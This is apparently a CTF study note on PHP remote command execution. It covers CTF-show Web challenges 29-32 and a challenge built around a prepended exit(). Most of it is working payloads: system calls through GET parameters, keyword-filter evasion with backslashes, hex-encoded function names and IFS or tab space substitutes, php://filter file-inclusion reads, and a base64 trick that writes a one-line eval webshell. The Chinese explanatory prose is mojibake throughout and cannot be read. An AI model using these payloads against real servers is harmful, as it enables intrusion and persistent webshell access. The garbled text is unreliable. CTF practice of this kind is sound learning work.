---
author: "Yiming Shen"
date: 2021-10-20
lastmod: 2021-10-22
title: "RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"
tags: [
    "CTF",
    "RCE",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\static\
---

æœ¬æ–‡ä»¥[CTF-show ](https://ctf.show/challenges#web30-392)Webå…¥é—¨29-41é¢˜ä½œä¸ºä¾‹é¢˜ï¼Œå­¦ä¹ RCEç›¸å…³çŸ¥è¯†ã€‚

## Web 29

è¿‡æ»¤äº†flagå­—æ ·

```php+HTML
?c=system("cat f*");
```

## Web 30

è¿‡æ»¤äº†`flag|system|php`ä¸‰ä¸ªå…³é”®å­—ï¼Œflagå’Œphpæ˜¯å¾…æ‰§è¡Œå‘½ä»¤æ–‡æœ¬ï¼Œ å¯ä»¥é€šè¿‡å¼•å·ã€æ–œæ æˆ–åæ–œæ ç»•è¿‡

```php
echo `cat f\lag.ph\p`;
```

**åå¼•å·å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤**

## Web 31

åœ¨catè¢«ç¦æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é‡‡ç”¨å¦‚ä¸‹å‘½ä»¤

> 1.tacï¼šä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œæ˜¯catçš„åå‘æ˜¾ç¤º
> 2.moreï¼šä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹
> 3.lessï¼šä¸moreç±»ä¼¼
> 4.headï¼šæŸ¥çœ‹æ–‡æ¡£çš„å‰å‡ è¡Œ
> 5.tailï¼šæŸ¥çœ‹æ–‡æ¡£çš„åå‡ è¡Œ
> 6.nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å…¥è¡Œå·
> 7.odï¼šä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹
> 8.viï¼šä¸€ç§ç¼–è¾‘å™¨
> 9.uniqï¼šæŸ¥çœ‹
> 10.vimï¼šä¸€ç§ç¼–è¯‘å™¨

ç©ºæ ¼çš„ä»£æ›¿ç¬¦å·ï¼š

> ```
> 1.${IFS}
> 2.$IFS$1
> 3.${IFS
> 4.%20
> 5.<å’Œ<>é‡å®šå‘ç¬¦
> 6.%09
> ```

æ„é€ æœ¬é¢˜payload

``` php
?c=echo'more%09f*';
```

>å…¶ä»–é¢˜è§£ï¼š
>```php
>?c=eval($_GET[1]);&1=system('cat flag.php');åµŒå¥—è„±ç¦»äº†cçš„æ­£åˆ™åˆ¤æ–­
>?c=echo`strings%09f*`;
>?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");ç­‰ä»·äºsystem()ã€‚è¿™ä¸ªå­¦åˆ°äº†ï¼
>```

## Web 32

å±è”½äº†`echo`

åˆ†å·å¯ä»¥ç”¨?>ä»£æ›¿ï¼Œæ‹¬å·å¯ä»¥ç”¨â€œâ€ç»•è¿‡ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«çš„æ–¹å¼æŸ¥çœ‹flag.phpï¼Œæ³¨æ„è¦å…ˆè¿›è¡Œbase64è½¬ç ä»¥ç»•è¿‡å…³é”®è¯è¿‡æ»¤ã€‚

```php
?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64-
encode/resource=flag.php
```

## ç»•è¿‡æ­»äº¡EXIT - CNSS å¤ªææŒé—¨äºº

```php
<?php
$filename=$_GET['filename'];
$content=$_GET['content'];
file_put_contents($filename,"<?php exit();".$content);
```

ä¸¤ä¸ªå‚æ•°å˜é‡é—´ç”¨`exit()`æ–¹æ³•éš”å¼€ï¼Œå³ä½¿æ³¨å…¥ä¸€å¥è¯ä¹Ÿæ— æ³•æ‰§è¡Œï¼Œå¦‚ä½•ç»•è¿‡è¿™ä¸ªâ€œæ­»äº¡exitâ€ï¼Ÿ

æˆ‘ä»¬åªéœ€è¦å°†`content`å‰é¢éƒ¨åˆ†å†…å®¹ä½¿ç”¨æŸç§æ‰‹æ®µ(å¦‚ç¼–ç )è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´PHPä¸èƒ½è¯†åˆ«è¯¥éƒ¨åˆ†å³å¯ã€‚

### base64ç»•è¿‡

`base64`ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç `base64`æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚

```php
?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
```



### [ğŸ˜®Mid]å¤ªææŒé—¨äºº


``` php
<?php
    error_reporting(0);
    show_source(__FILE__);

    function deleteDir($path) {

        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {

                        deleteDir($sonDir);

                        @rmdir($sonDir);

                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {

                        @unlink($sonDir);

                    }
                }
            }
            @rmdir($path);
        }
    }

    $devil = '<?php exit;?>';

    $goods = $_POST['goods'];

    file_put_contents($_POST['train'], $devil . $goods);

    sleep(1);

    deleteDir('.');

?>
```

ç½‘é¡µç»™å‡ºä»£ç å¦‚ä¸Šã€‚

å…³é”®ä»£ç ï¼š`file_put_contents`å†™å…¥æ–‡ä»¶ï¼Œå¦¥å¦¥çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚

``` php
?train=php://filter/convert.base64-decode/resource=1.php&goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
```

æ­¤æ—¶PHPæ‰§è¡Œçš„å‘½ä»¤ä¸ºï¼š

```php
file_put_contents("php://filter/convert.base64-decode/resource=1.php", '<?php exit;?>'."aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==");
```

æˆ‘ä»¬åœ¨PHPä¸­è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°æˆåŠŸåœ¨ç›®å½•ä¸‹å†™å…¥äº†æœ‰å‘½ä»¤æ‰§è¡Œ!

ç”±äºè¿™æ˜¯ä¸€ä¸ªé™æ€é¶æœºï¼Œä¸ºäº†å‡è½»æœåŠ¡å™¨è´Ÿæ‹…ï¼Œæ•…è€Œæœ‰åˆ é™¤ç›®å½•å‘½ä»¤çš„å­˜åœ¨ï¼Œå®šæ—¶æ¸…ç©ºç½‘ç«™æ ¹ç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬è¦åœ¨æ¸…ç©ºä¹‹å‰è¿å…¥shellè„šæœ¬ï¼Œè¯»å–flag.phpæ–‡ä»¶å†…å®¹ï¼Œæ‹¿åˆ°flagã€‚

![image-20211021205217701](13.RCEä¸“æ .assets/image-20211021205217701.png)

### å‚è€ƒ

[1] [è¯¦è§£PHP://filterä»¥åŠæ­»äº¡ç»•è¿‡](https://blog.csdn.net/woshilnp/article/details/117266628)

